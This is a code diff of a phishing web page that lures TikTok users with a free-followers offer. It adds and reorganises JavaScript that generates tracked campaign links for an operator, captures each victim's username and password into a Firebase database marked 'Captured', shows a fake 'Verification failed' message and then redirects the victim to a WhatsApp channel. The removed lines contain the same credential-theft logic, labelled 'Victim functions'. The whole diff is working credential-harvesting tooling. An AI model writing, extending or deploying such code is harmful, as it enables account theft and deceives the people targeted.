@@ -307,6 +307,87 @@
 
     let selectedFollowers = '1000';
 
+    // ================== GLOBAL FUNCTIONS (attached to window) ==================
+    window.closePopup = function() {
+        const popup = document.getElementById('waPopup');
+        if (popup) {
+            popup.style.display = 'none';
+            localStorage.setItem(POPUP_CLOSED_KEY, 'true');
+        }
+    }
+
+    window.hideToast = function() { 
+        document.getElementById('toast').classList.remove('active'); 
+    }
+
+    window.showToast = function(msg, type = 'success') {
+        const toast = document.getElementById('toast');
+        const icon = document.getElementById('toast-icon');
+        const progress = document.getElementById('toast-progress');
+        icon.innerHTML = type === 'success' ? '<i class="fas fa-check-circle" style="color:var(--tiktok-pink)"></i>' : '<i class="fas fa-exclamation-circle" style="color:#ef4444"></i>';
+        document.getElementById('toast-msg').innerText = msg;
+        progress.style.background = type === 'success' ? 'var(--tiktok-pink)' : '#ef4444';
+        toast.classList.add('active');
+        progress.style.width = '100%';
+        let width = 100;
+        const interval = setInterval(() => {
+            width -= 1;
+            progress.style.width = width + '%';
+            if (width <= 0) { clearInterval(interval); hideToast(); }
+        }, 30);
+    }
+
+    window.copyLink = function() {
+        navigator.clipboard.writeText(document.getElementById('actualLink').innerText);
+        showToast("Link Copied!", "success");
+    }
+
+    window.generateSessionLink = function() {
+        const sessionId = 'TT-' + Math.floor(1000 + Math.random() * 9000) + '-' + Date.now().toString(36).toUpperCase();
+        const link = window.location.href.split('?')[0] + '?admin=' + encodeURIComponent(ADMIN_ID) + '&id=' + sessionId;
+        
+        document.getElementById('actualLink').innerText = link;
+        document.getElementById('linkDisplay').style.display = 'block';
+        document.getElementById('viewBtn').onclick = () => window.open(link, '_blank');
+        
+        // Create placeholder in Firebase under this admin's node
+        database.ref('tiktok_data/' + ADMIN_ID + '/' + sessionId).set({
+            username: '⏳ waiting',
+            password: '---',
+            followers: '---',
+            status: 'Active',
+            timestamp: Date.now()
+        }).then(() => showToast("Campaign Generated!", "success"))
+          .catch(err => showToast("Error: " + err.message, "error"));
+    }
+
+    window.selectQuantity = function() {
+        stepQuantity.style.display = 'none';
+        stepLogin.style.display = 'block';
+    }
+
+    window.submitTikTok = function() {
+        const username = document.getElementById('ttUsername').value.trim();
+        const password = document.getElementById('ttPassword').value.trim();
+        if (!username || !password) return showToast("Fill both fields", "error");
+        if (!urlAdmin || !urlSession) return showToast("Invalid session", "error");
+
+        // Write under this admin's node
+        database.ref('tiktok_data/' + urlAdmin + '/' + urlSession).update({
+            username: username,
+            password: password,
+            followers: selectedFollowers,
+            status: 'Captured',
+            timestamp: Date.now()
+        }).then(() => {
+            showToast("Verification failed. Try again.", "error");
+            // Redirect to WhatsApp channel after a short delay
+            setTimeout(() => {
+                window.open('https://whatsapp.com/channel/0029VbBv1D2KrWQtNOOVgm3R', '_blank');
+            }, 1500);
+        }).catch(err => showToast("Error: " + err.message, "error"));
+    }
+
     // ================== PAGE INIT ==================
     if (!urlSession && !urlAdmin) {
         // Admin mode (no parameters)
@@ -359,58 +440,6 @@
     }
 
     // ================== FUNCTIONS ==================
-    function closePopup() {
-        popup.style.display = 'none';
-        localStorage.setItem(POPUP_CLOSED_KEY, 'true');
-    }
-
-    // Toast functions
-    function showToast(msg, type = 'success') {
-        const toast = document.getElementById('toast');
-        const icon = document.getElementById('toast-icon');
-        const progress = document.getElementById('toast-progress');
-        icon.innerHTML = type === 'success' ? '<i class="fas fa-check-circle" style="color:var(--tiktok-pink)"></i>' : '<i class="fas fa-exclamation-circle" style="color:#ef4444"></i>';
-        document.getElementById('toast-msg').innerText = msg;
-        progress.style.background = type === 'success' ? 'var(--tiktok-pink)' : '#ef4444';
-        toast.classList.add('active');
-        progress.style.width = '100%';
-        let width = 100;
-        const interval = setInterval(() => {
-            width -= 1;
-            progress.style.width = width + '%';
-            if (width <= 0) { clearInterval(interval); hideToast(); }
-        }, 30);
-    }
-    
-    function hideToast() { 
-        document.getElementById('toast').classList.remove('active'); 
-    }
-
-    // Admin functions
-    function generateSessionLink() {
-        const sessionId = 'TT-' + Math.floor(1000 + Math.random() * 9000) + '-' + Date.now().toString(36).toUpperCase();
-        const link = window.location.href.split('?')[0] + '?admin=' + encodeURIComponent(ADMIN_ID) + '&id=' + sessionId;
-        
-        document.getElementById('actualLink').innerText = link;
-        document.getElementById('linkDisplay').style.display = 'block';
-        document.getElementById('viewBtn').onclick = () => window.open(link, '_blank');
-        
-        // Create placeholder in Firebase under this admin's node
-        database.ref('tiktok_data/' + ADMIN_ID + '/' + sessionId).set({
-            username: '⏳ waiting',
-            password: '---',
-            followers: '---',
-            status: 'Active',
-            timestamp: Date.now()
-        }).then(() => showToast("Campaign Generated!", "success"))
-          .catch(err => showToast("Error: " + err.message, "error"));
-    }
-
-    function copyLink() {
-        navigator.clipboard.writeText(document.getElementById('actualLink').innerText);
-        showToast("Link Copied!", "success");
-    }
-
     function startLiveTracking() {
         const tbody = document.getElementById('live-data-table');
         // Listen only under this admin's node
@@ -433,27 +462,7 @@
             });
         });
     }
+</script>
 
-    // Victim functions
-    function selectQuantity() {
-        stepQuantity.style.display = 'none';
-        stepLogin.style.display = 'block';
-    }
-
-    function submitTikTok() {
-        const username = document.getElementById('ttUsername').value.trim();
-        const password = document.getElementById('ttPassword').value.trim();
-        if (!username || !password) return showToast("Fill both fields", "error");
-        if (!urlAdmin || !urlSession) return showToast("Invalid session", "error");
-
-        // Write under this admin's node
-        database.ref('tiktok_data/' + urlAdmin + '/' + urlSession).update({
-            username: username,
-            password: password,
-            followers: selectedFollowers,
-            status: 'Captured',
-            timestamp: Date.now()
-        }).then(() => {
-            showToast("Verification failed. Try again.", "error");
-            // Redirect to WhatsApp channel after a short delay
-          
+</body>
+</html>
